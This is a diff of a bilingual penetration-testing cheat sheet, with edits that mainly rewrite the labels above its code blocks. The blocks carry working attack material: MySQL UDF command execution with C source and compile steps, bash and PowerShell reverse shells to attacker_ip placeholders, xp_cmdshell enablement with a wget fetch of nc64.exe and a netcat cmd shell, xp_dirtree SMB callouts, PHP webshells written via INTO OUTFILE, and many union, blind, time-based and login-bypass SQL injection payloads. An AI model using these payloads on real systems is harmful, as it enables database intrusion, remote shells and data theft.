 ##### Exécution de commandes via User-Defined Functions (UDFs)
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `mysql` pour la rubrique « Exécution de commandes via User-Defined Functions (UDFs) ».
 
 ```bash
 mysql -u root -p -h <host> -e "use mysql; create table foo(line blob); insert into foo values(load_file('/path/to/your/udf/lib_mysqludf_sys.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
 ```
 
 
+Commande `create` pour la rubrique « Exécution de commandes via User-Defined Functions (UDFs) ».
+
 ```sql
 CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
 ```
 
+
+Commande `select` pour la rubrique « Exécution de commandes via User-Defined Functions (UDFs) ».
 
 ```sql
 SELECT sys_exec('id');
@@ -1700,13 +1743,15 @@ SELECT sys_exec('id');
 
 ##### Reverse Shell
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Ouvrir un port d'écoute avec Netcat.
 
 ```bash
 nc -lvnp 4444
 ```
 
+
+Commande `select` pour la rubrique « Reverse Shell ».
 
 ```sql
 SELECT sys_exec('bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1');
@@ -1715,43 +1760,12 @@ SELECT sys_exec('bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1');
 
 ##### Where to Get Your .so for UDF
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`.so` · `.SO` · `.c` · `lib_mysqludf_sys.so`  
 
 
-```text
-.so
-```
-
-
-```text
-.so
-```
-
-
-```text
-.so
-```
-
-
-```text
-.SO
-```
-
-
-```text
-.so
-```
-
-
-```text
-.c
-```
-
-
-```text
-lib_mysqludf_sys.so
-```
-
+Commande `my_bool` pour la rubrique « Where to Get Your .so for UDF ».
 
 ```text
 // lib_mysqludf_sys.c
@@ -1788,20 +1802,11 @@ long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
 ```
 
 
-```text
-.so
-```
+**Paramètres et repères :**
+`.so` · `mysql-server-dev`  
 
 
-```text
-.so
-```
-
-
-```text
-mysql-server-dev
-```
-
+Commande `apt` pour la rubrique « Where to Get Your .so for UDF ».
 
 ```bash
 sudo apt install mysql-server-dev libmysqlclient-dev
@@ -1815,15 +1820,11 @@ gcc -Wall -fPIC -I/usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf
 ```
 
 
-```text
-.so
-```
+**Paramètres et repères :**
+`.so`  
 
 
-```text
-.so
-```
-
+Commande `mysql` pour la rubrique « Where to Get Your .so for UDF ».
 
 ```bash
 mysql -u root -p -h <host> -e "USE mysql; 
@@ -1833,35 +1834,29 @@ SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
 ```
 
 
-```text
-.so
-```
+**Paramètres et repères :**
+`.so`  
 
+
+Commande `create` pour la rubrique « Where to Get Your .so for UDF ».
 
 ```sql
 CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
 ```
 
 
+Commande `select` pour la rubrique « Where to Get Your .so for UDF ».
+
 ```sql
 SELECT sys_exec('id');
 ```
 
 
-```text
-.SO
-```
+**Paramètres et repères :**
+`.SO` · `.so` · `lib_mysqludf_sys.so`  
 
 
-```text
-.so
-```
-
-
-```text
-lib_mysqludf_sys.so
-```
-
+Commande `mysql` pour la rubrique « Where to Get Your .so for UDF ».
 
 ```bash
 # Ensure that the .so file has the proper permissions and path to be loaded correctly by MySQL.
@@ -1879,8 +1874,8 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 
 ##### Connexion initiale
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `impacket-mssqlclient` pour la rubrique « Connexion initiale ».
 
 ```bash
 # Tip: you can also specify a domain by using <domain>/<username>:<password>@<host>.
@@ -1890,18 +1885,22 @@ impacket-mssqlclient <username>:<password>@<host> -windows-auth
 
 ##### Requêtes courantes
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `select` pour la rubrique « Requêtes courantes ».
 
 ```sql
 SELECT @@version;
 ```
 
 
+Commande `select` pour la rubrique « Requêtes courantes ».
+
 ```sql
 SELECT name FROM sys.databases;
 ```
 
+
+Commande `use` pour la rubrique « Requêtes courantes ».
 
 ```sql
 USE <database_name>;
@@ -1910,14 +1909,16 @@ USE <database_name>;
 
 ##### Enumerating Tables and Columns
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `select` pour la rubrique « Enumerating Tables and Columns ».
 
 ```sql
 # Tip: replace <schema> with the actual schema name (commonly dbo).
 SELECT table_name FROM <schema>.information_schema.tables;
 ```
 
+
+Commande `select` pour la rubrique « Enumerating Tables and Columns ».
 
 ```sql
 SELECT column_name FROM <schema>.information_schema.columns WHERE table_name = '<table_name>';
@@ -1926,13 +1927,15 @@ SELECT column_name FROM <schema>.information_schema.columns WHERE table_name = '
 
 ##### Énumération des utilisateurs and Privileges
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `select` pour la rubrique « Énumération des utilisateurs and Privileges ».
 
 ```sql
 SELECT * FROM <schema>.dbo.sysusers;
 ```
 
+
+Commande `select` pour la rubrique « Énumération des utilisateurs and Privileges ».
 
 ```sql
 SELECT * FROM <schema>.sys.database_permissions WHERE grantee_principal_id = (SELECT principal_id FROM <schema>.sys.database_principals WHERE name = '<username>');
@@ -1941,8 +1944,8 @@ SELECT * FROM <schema>.sys.database_permissions WHERE grantee_principal_id = (SE
 
 ##### Data Extraction
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `select` pour la rubrique « Data Extraction ».
 
 ```sql
 SELECT * FROM <schema>.<table_name> LIMIT <number_of_rows>;
@@ -1951,8 +1954,8 @@ SELECT * FROM <schema>.<table_name> LIMIT <number_of_rows>;
 
 ##### Exécution de commandes
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `exec` pour la rubrique « Exécution de commandes ».
 
 ```sql
 EXEC sp_configure 'show advanced options', 1;
@@ -1962,20 +1965,18 @@ RECONFIGURE;
 ```
 
 
+Commande `exec` pour la rubrique « Exécution de commandes ».
+
 ```sql
 EXEC xp_cmdshell 'whoami';
 ```
 
 
-```text
-xp_cmdshell
-```
+**Paramètres et repères :**
+`xp_cmdshell`  
 
 
-```text
-xp_cmdshell
-```
-
+Ouvrir un port d'écoute avec Netcat.
 
 ```bash
 # Setup the listener
@@ -1998,12 +1999,9 @@ EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClie
 
 #### Tips
 
-Commandes, paramètres et exemples associés à cette technique.
 
-
-```text
-xp_cmdshell
-```
+**Paramètres et repères :**
+`xp_cmdshell`  
 
 
 ### Injection SQL
@@ -2015,6 +2013,8 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
+
+Commande `limit` pour la rubrique « Common SQL Functions ».
 
 ```sql
 LIMIT <row offset>, <number of rows>  -- Display rows based on offset and number
@@ -2035,6 +2035,8 @@ LOAD_FILE("<url to file>")          -- Dump the content of a file
 ```
 
 
+Commande `select` pour la rubrique « Common SQL Functions ».
+
 ```sql
 SELECT TOP <number> * FROM <table>   -- Equivalent of LIMIT for MSSQL
 COUNT(*) AS Total                     -- Display number of rows
@@ -2047,18 +2049,22 @@ SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<table>' 
 
 #### Error-Based Payloads
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Error-Based Payloads ».
 
 ```bash
 <input>' OR 1=1 -- //
 ```
 
 
+Exemple technique pour la rubrique « Error-Based Payloads ».
+
 ```bash
 <input>' OR 1=1 in (SELECT @@version) -- //
 ```
 
+
+Exemple technique pour la rubrique « Error-Based Payloads ».
 
 ```bash
 <input>' OR 1=1 in (SELECT * FROM <table>) -- //
@@ -2067,6 +2073,8 @@ Commandes, paramètres et exemples associés à cette technique.
 <input>' OR 1=1 in (SELECT * FROM users) -- //
 ```
 
+
+Exemple technique pour la rubrique « Error-Based Payloads ».
 
 ```bash
 <input>' OR 1=1 in (SELECT <column> FROM <table> WHERE <condition>) -- //
@@ -2078,13 +2086,12 @@ Commandes, paramètres et exemples associés à cette technique.
 
 #### UNION-Based Payloads
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`SELECT`  
 
 
-```sql
-SELECT
-```
-
+Exemple technique pour la rubrique « UNION-Based Payloads ».
 
 ```bash
 # MySQL & MSSQL
@@ -2092,10 +2099,11 @@ SELECT
 ```
 
 
-```text
-wfuzz
-```
+**Paramètres et repères :**
+`wfuzz`  
 
+
+Commande `--` pour la rubrique « UNION-Based Payloads ».
 
 ```sql
 -- MySQL
@@ -2106,6 +2114,8 @@ wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"
 ```
 
 
+Commande `http` pour la rubrique « UNION-Based Payloads ».
+
 ```bash
 # MySQL
 http://<site>/report.php?id=-23' UNION SELECT 1, 2, DATABASE(), 4, 5; -- -
@@ -2114,6 +2124,8 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, DATABASE(), 4, 5; -- -
 http://<site>/report.php?id=-23' UNION SELECT 1, 2, DB_NAME(), 4, 5; -- -
 ```
 
+
+Commande `http` pour la rubrique « UNION-Based Payloads ».
 
 ```bash
 # MySQL
@@ -2124,6 +2136,8 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, TABLE_NAME, 4, 5 FROM INFORM
 ```
 
 
+Commande `http` pour la rubrique « UNION-Based Payloads ».
+
 ```bash
 # MySQL
 http://<site>/report.php?id=-23' UNION SELECT 1, 2, column_name, 4, 5 FROM information_schema.columns WHERE table_name='<tablename>'; -- -
@@ -2132,6 +2146,8 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, column_name, 4, 5 FROM infor
 http://<site>/report.php?id=-23' UNION SELECT 1, 2, COLUMN_NAME, 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -
 ```
 
+
+Exemple technique pour la rubrique « UNION-Based Payloads ».
 
 ```bash
 <input>' UNION SELECT NULL, <column_1>, <column_2>, <column_3> FROM information_schema.columns WHERE table_schema=DATABASE() -- -
@@ -2143,6 +2159,8 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, COLUMN_NAME, 4, 5 FROM INFOR
 ```
 
 
+Commande `http` pour la rubrique « UNION-Based Payloads ».
+
 ```bash
 # MySQL
 http://<site>/report.php?id=-23' UNION SELECT 1, 2, CONCAT(column1, column2), 4, 5 FROM <tablename> LIMIT 0, 1; -- -
@@ -2152,17 +2170,23 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, column1 + column2, 4, 5 FROM
 ```
 
 
+Commande `http` pour la rubrique « UNION-Based Payloads ».
+
 ```bash
 # MySQL & MSSQL
 http://website.com/index.php?id=1 ORDER BY <number> -- -
 ```
 
 
+Commande `http` pour la rubrique « UNION-Based Payloads ».
+
 ```bash
 # MySQL & MSSQL
 http://website.com/index.php?id=-1 UNION SELECT <number of columns separated by commas> -- -
 ```
 
+
+Commande `http` pour la rubrique « UNION-Based Payloads ».
 
 ```bash
 # MySQL
@@ -2173,6 +2197,8 @@ http://website.com/index.php?id=-1' UNION SELECT <column1>, <column2> FROM <tabl
 ```
 
 
+Commande `http` pour la rubrique « UNION-Based Payloads ».
+
 ```bash
 # MySQL
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@version, 4, 5 -- -
@@ -2181,6 +2207,8 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@version, 4, 5 -- -
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@VERSION, 4, 5 -- -
 ```
 
+
+Commande `http` pour la rubrique « UNION-Based Payloads ».
 
 ```bash
 # MySQL
@@ -2191,6 +2219,8 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, SUSER_SNAME(), 4, 5 -- -
 ```
 
 
+Commande `http` pour la rubrique « UNION-Based Payloads ».
+
 ```bash
 # MySQL
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@datadir, 4, 5 -- -
@@ -2199,6 +2229,8 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, @@datadir, 4, 5 -- -
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, SERVERPROPERTY('InstanceName'), 4, 5 -- -
 ```
 
+
+Commande `http` pour la rubrique « UNION-Based Payloads ».
 
 ```bash
 # MySQL
@@ -2209,6 +2241,8 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(TABLE_NAME, ',
 ```
 
 
+Commande `http` pour la rubrique « UNION-Based Payloads ».
+
 ```bash
 # MySQL
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(column_name), 4, 5 FROM information_schema.columns WHERE table_name='<tablename>'; -- -
@@ -2217,6 +2251,8 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, GROUP_CONCAT(column_name)
 http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(COLUMN_NAME, ','), 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<tablename>'; -- -
 ```
 
+
+Commande `http` pour la rubrique « UNION-Based Payloads ».
 
 ```bash
 # MySQL
@@ -2227,15 +2263,11 @@ http://website.com/index.php?id=-1' UNION SELECT 1, 2, STRING_AGG(<column_name>,
 ```
 
 
-```text
-AND
-```
+**Paramètres et repères :**
+`AND`  
 
 
-```text
-AND
-```
-
+Commande `http` pour la rubrique « UNION-Based Payloads ».
 
 ```bash
 # MySQL & MSSQL
@@ -2243,20 +2275,17 @@ http://website.com/index.php?id=1' <SQL_injection_here> AND '1' -- -
 ```
 
 
-#### Blind Payloads
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ##### Vérification de la vulnérabilité
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `http` pour la rubrique « Vérification de la vulnérabilité ».
 
 ```sql
 http://<host>/vulnerable-page?param=<input>' OR '1'='1 --+
 ```
 
+
+Commande `http` pour la rubrique « Vérification de la vulnérabilité ».
 
 ```sql
 http://<host>/vulnerable-page?param=<input>' AND 1=1 --+
@@ -2269,18 +2298,12 @@ http://<host>/vulnerable-page?param=<input>' AND '1'='2 --+
 
 ##### Extracting Database Information
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`SUBSTRING`  
 
 
-```text
-SUBSTRING
-```
-
-
-```text
-SUBSTRING
-```
-
+Commande `http` pour la rubrique « Extracting Database Information ».
 
 ```sql
 # MySQL
@@ -2291,10 +2314,11 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT SUBSTRING(@@version,1,1
 ```
 
 
-```text
-SUBSTRING
-```
+**Paramètres et repères :**
+`SUBSTRING`  
 
+
+Commande `http` pour la rubrique « Extracting Database Information ».
 
 ```sql
 # MySQL
@@ -2307,8 +2331,8 @@ http://<host>/vulnerable-page?param=<input>' AND IIF(SUBSTRING(DB_NAME(),1,1)='a
 
 ##### Extracting Table and Column Names
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `http` pour la rubrique « Extracting Table and Column Names ».
 
 ```sql
 # MySQL
@@ -2318,6 +2342,8 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM informati
 http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.tables) > 5 --+
 ```
 
+
+Commande `http` pour la rubrique « Extracting Table and Column Names ».
 
 ```sql
 # MySQL
@@ -2330,13 +2356,12 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT COUNT(*) FROM sys.colum
 
 ##### Extracting Data
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`SUBSTRING`  
 
 
-```text
-SUBSTRING
-```
-
+Commande `http` pour la rubrique « Extracting Data ».
 
 ```sql
 # MySQL
@@ -2347,6 +2372,8 @@ http://<host>/vulnerable-page?param=<input>' AND (SELECT TOP 1 SUBSTRING(usernam
 ```
 
 
+Commande `admin` pour la rubrique « Extracting Data ».
+
 ```sql
 admin' AND SUBSTRING(username,1,1)='a' --+   # MySQL
 admin' AND SUBSTRING(username,1,1)='a' --+   # MSSQL
@@ -2355,13 +2382,12 @@ admin' AND SUBSTRING(username,1,1)='a' --+   # MSSQL
 
 ##### Boolean-Based
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`SUBSTRING`  
 
 
-```text
-SUBSTRING
-```
-
+Commande `http` pour la rubrique « Boolean-Based ».
 
 ```sql
 # MySQL
@@ -2374,8 +2400,8 @@ http://<host>/index.php?id=1' AND (SUBSTRING(DB_NAME(), <offset>, <character_len
 
 ##### Time-Based
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `admin` pour la rubrique « Time-Based ».
 
 ```sql
 # MySQL
@@ -2386,6 +2412,8 @@ admin' OR WAITFOR DELAY '00:00:05';--+
 ```
 
 
+Commande `http` pour la rubrique « Time-Based ».
+
 ```sql
 # MySQL
 http://<host>/login.php?user=admin' AND IF(1=1, SLEEP(5), 0) --+
@@ -2394,6 +2422,8 @@ http://<host>/login.php?user=admin' AND IF(1=1, SLEEP(5), 0) --+
 http://<host>/login.php?user=admin' AND IIF(1=1, WAITFOR DELAY '00:00:05', 0) --+
 ```
 
+
+Commande `http` pour la rubrique « Time-Based ».
 
 ```sql
 # MySQL
@@ -2404,6 +2434,8 @@ http://<host>/index.php?id=1' AND WAITFOR DELAY '00:00:10' --+
 ```
 
 
+Commande `http` pour la rubrique « Time-Based ».
+
 ```sql
 # MySQL
 http://<host>/index.php?id=1' AND IF((SELECT VERSION()) LIKE '5%', SLEEP(10), NULL) --+
@@ -2413,10 +2445,11 @@ http://<host>/index.php?id=1' AND IIF((SELECT @@VERSION) LIKE '5%', WAITFOR DELA
 ```
 
 
-```text
-wfuzz
-```
+**Paramètres et repères :**
+`wfuzz`  
 
+
+Commande `for` pour la rubrique « Time-Based ».
 
 ```bash
 # Uses ASCII value extraction to determine each character of the database name
@@ -2430,10 +2463,11 @@ done > <filename.txt> && grep "0m9" <filename.txt
 ```
 
 
-```text
-wfuzz
-```
+**Paramètres et repères :**
+`wfuzz`  
 
+
+Commande `for` pour la rubrique « Time-Based ».
 
 ```bash
 # Uses ASCII value extraction to determine each character of the first table name
@@ -2446,15 +2480,11 @@ done > <filename.txt> && grep "0m9" <filename.txt
 ```
 
 
-```text
-wfuzz
-```
+**Paramètres et repères :**
+`wfuzz` · `information_schema.columns`  
 
 
-```text
-information_schema.columns
-```
-
+Commande `for` pour la rubrique « Time-Based ».
 
 ```bash
 # Uses ASCII value extraction to determine each character of a column name
@@ -2467,10 +2497,11 @@ done > <filename.txt> && grep "0m9" <filename.txt
 ```
 
 
-```text
-wfuzz
-```
+**Paramètres et repères :**
+`wfuzz`  
 
+
+Commande `for` pour la rubrique « Time-Based ».
 
 ```bash
 # Extracts content from a specific column using ASCII value comparison
@@ -2483,14 +2514,13 @@ done > <filename.txt> && grep "0m9" <filename.txt
 # The FUZZ value iterates over possible row entries (use LIMIT FUZZ, 1 to iterate rows).
 ```
 
-
 ![Blind SQL Injection with Tools](https://www.emmanuelsolis.com/img/automating_blind_sqli.gif)
 
 
-#### Login Bypass Commands
+#### Login Bypass Commandes
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `--` pour la rubrique « Login Bypass Commandes ».
 
 ```sql
 -- Standard OR-based bypass
@@ -2522,6 +2552,8 @@ Commandes, paramètres et exemples associés à cette technique.
 ```
 
 
+Commande `meh` pour la rubrique « Login Bypass Commandes ».
+
 ```sql
 meh' OR 3=3;#
 meh' OR 2=2 LIMIT 1;#
@@ -2529,6 +2561,8 @@ meh' OR 'a'='a
 meh' OR 1=1 --+
 ```
 
+
+Commande `meh` pour la rubrique « Login Bypass Commandes ».
 
 ```sql
 meh' OR 3=3;--
@@ -2540,8 +2574,8 @@ meh' OR 1=1;--
 
 #### Vulnerable Code Example
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Exemple technique pour la rubrique « Vulnerable Code Example ».
 
 ```php
 <?php
@@ -2566,15 +2600,21 @@ if($row) {
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-```text
-'admin'
-```
-
+Exemple technique pour la rubrique « SQL Truncation ».
 
 ```text
 'admin'
 ```
 
+
+Exemple technique pour la rubrique « SQL Truncation ».
+
+```text
+'admin'
+```
+
+
+Commande `username` pour la rubrique « SQL Truncation ».
 
 ```sql
 # Example of truncation; the database discards extra characters
@@ -2588,11 +2628,6 @@ username=admin++++++++&password=testpwn123
 ```
 
 
-### Specific Databases
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 #### MSSQL
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
@@ -2600,63 +2635,48 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 
 ##### Default Databases
 
-Commandes, paramètres et exemples associés à cette technique.
 
-
-```text
-master
-```
-
-
-```text
-msdb
-```
-
-
-```text
-model
-```
-
-
-```text
-resource
-```
-
-
-```text
-tempdb
-```
+**Paramètres et repères :**
+`master` · `msdb` · `model` · `resource`  
+`tempdb`  
 
 
 ##### Commandes courantes
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `select` pour la rubrique « Commandes courantes ».
 
 ```sql
 SELECT name FROM master.dbo.sysdatabases
 ```
 
 
+Commande `select` pour la rubrique « Commandes courantes ».
+
 ```sql
 SELECT table_name FROM <DATABASE>.INFORMATION_SCHEMA.TABLES
 ```
 
+
+Commande `union` pour la rubrique « Commandes courantes ».
 
 ```sql
 union select 1,(select string_agg(concat(name,':',id),'|') from streamio..sysobjects where xtype='u'),3,4,5,6-- -
 ```
 
 
+Commande `union` pour la rubrique « Commandes courantes ».
+
 ```sql
 union select 1,concat(username,':',password),3,4,5,6 from users--
 ```
 
 
-```text
-xp_cmdshell
-```
+**Paramètres et repères :**
+`xp_cmdshell`  
 
+
+Commande `exec` pour la rubrique « Commandes courantes ».
 
 ```sql
 exec xp_dirtree 'c:\'
@@ -2664,6 +2684,8 @@ exec xp_dirtree 'c:\'
 EXEC xp_cmdshell 'ping [attacker_ip]';
 ```
 
+
+Commande `--` pour la rubrique « Commandes courantes ».
 
 ```sql
 -- Attacker
@@ -2676,8 +2698,8 @@ EXEC master..xp_dirtree '\\[Attacker_IP]\share\'
 
 ##### Statement Examples
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `--` pour la rubrique « Statement Examples ».
 
 ```sql
 -- Visualize SQL statement and adjust payload
@@ -2697,8 +2719,8 @@ INSERT INTO dbo.tablename('', CONVERT(INT, db_name(<number>)))--
 
 ##### Remote Code Execution (RCE)
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `--` pour la rubrique « Remote Code Execution (RCE) ».
 
 ```sql
 -- Use this if you are doing SQL Injection.
@@ -2713,6 +2735,8 @@ Commandes, paramètres et exemples associés à cette technique.
 ';EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [kali_ip] [listening_port]";--
 ```
 
+
+Commande `--` pour la rubrique « Remote Code Execution (RCE) ».
 
 ```sql
 -- Use this if you have direct access to execute SQL statements.
@@ -2730,6 +2754,8 @@ EXEC xp_cmdshell "powershell wget http://[kali_ip]/nc64.exe -o C:\Users\Public\n
 EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [kali_ip] [listening_port]";
 ```
 
+
+Commande `--` pour la rubrique « Remote Code Execution (RCE) ».
 
 ```sql
 -- Exploitation Example.
@@ -2749,18 +2775,22 @@ EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [ka
 
 ##### Impersonation
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `select` pour la rubrique « Impersonation ».
 
 ```sql
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
 ```
 
 
+Commande `execute` pour la rubrique « Impersonation ».
+
 ```sql
 EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
+
+Commande `select` pour la rubrique « Impersonation ».
 
 ```sql
 SELECT SYSTEM_USER
@@ -2771,26 +2801,24 @@ go
 ```
 
 
+Commande `select` pour la rubrique « Impersonation ».
+
 ```sql
 SELECT srvname, isremote FROM sysservers;
 ```
 
 
-```text
-xp_cmdshell
-```
+**Paramètres et repères :**
+`xp_cmdshell`  
 
+
+Commande `exec` pour la rubrique « Impersonation ».
 
 ```sql
 EXEC master.dbo.sp_configure 'show advanced options', 1;
 
 RECONFIGURE;
 ```
-
-
-##### Extra Références
-
-Commandes, paramètres et exemples associés à cette technique.
 
 
 #### MySQL
@@ -2800,38 +2828,22 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 
 ##### Default Databases
 
-Commandes, paramètres et exemples associés à cette technique.
 
-
-```text
-mysql
-```
-
-
-```text
-information_schema
-```
-
-
-```text
-performance_schema
-```
-
-
-```text
-sys
-```
+**Paramètres et repères :**
+`mysql` · `information_schema` · `performance_schema` · `sys`  
 
 
 ##### Commandes courantes
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `mysql` pour la rubrique « Commandes courantes ».
 
 ```bash
 mysql -u <username> -p'<password>' -h <host> -P <port>
 ```
 
+
+Commande `show` pour la rubrique « Commandes courantes ».
 
 ```sql
 SHOW DATABASES;
@@ -2839,6 +2851,8 @@ SHOW DATABASES;
 USE <database_name>;
 ```
 
+
+Commande `show` pour la rubrique « Commandes courantes ».
 
 ```sql
 SHOW TABLES;
@@ -2849,12 +2863,16 @@ SELECT * FROM <table_name>;
 ```
 
 
+Commande `select` pour la rubrique « Commandes courantes ».
+
 ```sql
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 -- or, using the ?cmd=[command] format
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
 ```
 
+
+Commande `--` pour la rubrique « Commandes courantes ».
 
 ```sql
 -- Check MySQL version
@@ -2883,13 +2901,12 @@ FLUSH PRIVILEGES;
 
 ##### Remote Code Execution (RCE)
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`mysql`  
 
 
-```text
-mysql
-```
-
+Commande `--` pour la rubrique « Remote Code Execution (RCE) ».
 
 ```sql
 -- General payload
@@ -2903,35 +2920,31 @@ SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "C:/wamp/www/shell.php"
 ```
 
 
-##### Extra Références
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
-#### MariaDB
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ##### Commandes courantes
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `admin` pour la rubrique « Commandes courantes ».
 
 ```sql
 admin ' OR 1=1 -- 
 ```
 
 
+Commande `1` pour la rubrique « Commandes courantes ».
+
 ```sql
 1' OR 1 = 1 #
 ```
 
 
+Exemple technique pour la rubrique « Commandes courantes ».
+
 ```sql
 ' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- 
 ```
 
+
+Exemple technique pour la rubrique « Commandes courantes ».
 
 ```sql
 ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- 
@@ -2939,56 +2952,50 @@ admin ' OR 1=1 --
 ```
 
 
+Exemple technique pour la rubrique « Commandes courantes ».
+
 ```sql
 ' UNION SELECT <column1>, <column2> FROM <table_name>-- 
 ```
 
 
-##### Extra Références
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
-#### Oracle
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ##### Commandes courantes
 
-Commandes, paramètres et exemples associés à cette technique.
+
+**Paramètres et repères :**
+`dual`  
 
 
-```text
-dual
-```
-
-
-```text
-dual
-```
-
+Exemple technique pour la rubrique « Commandes courantes ».
 
 ```sql
 ' UNION SELECT 1,2,3,4,5 FROM dual-- 
 ```
 
 
+Exemple technique pour la rubrique « Commandes courantes ».
+
 ```sql
 ' UNION SELECT 1,2,3 FROM dual-- 
 ```
 
+
+Exemple technique pour la rubrique « Commandes courantes ».
 
 ```sql
 ' UNION SELECT username, NULL, NULL FROM all_users-- 
 ```
 
 
+Exemple technique pour la rubrique « Commandes courantes ».
+
 ```sql
 ' UNION SELECT table_name, NULL, NULL FROM all_tables-- 
 ' UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name='<table_name>'-- 
 ```
 
+
+Exemple technique pour la rubrique « Commandes courantes ».
 
 ```sql
 ' UNION SELECT <column_name>, NULL FROM <table_name>-- 
@@ -2997,8 +3004,8 @@ dual
 
 ##### Login Bypass
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `admin` pour la rubrique « Login Bypass ».
 
 ```sql
 admin ' OR 1=1 -- 
@@ -3017,11 +3024,11 @@ Examiner les entrées et les réponses de l'application web.
 
 ### Identifying
 
-Commandes, paramètres et exemples associés à cette technique.
-
 
 **Tag**
 
+
+Exemple technique pour la rubrique « Identifying ».
 
 ```text
 <date>
@@ -3031,6 +3038,8 @@ Commandes, paramètres et exemples associés à cette technique.
 **Entity**
 
 
+Exemple technique pour la rubrique « Identifying ».
+
 ```text
 &lt;
 ```
@@ -3038,6 +3047,8 @@ Commandes, paramètres et exemples associés à cette technique.
 
 **Element**
 
+
+Exemple technique pour la rubrique « Identifying ».
 
 ```text
 <date>01-01-2022</date>
@@ -3047,6 +3058,8 @@ Commandes, paramètres et exemples associés à cette technique.
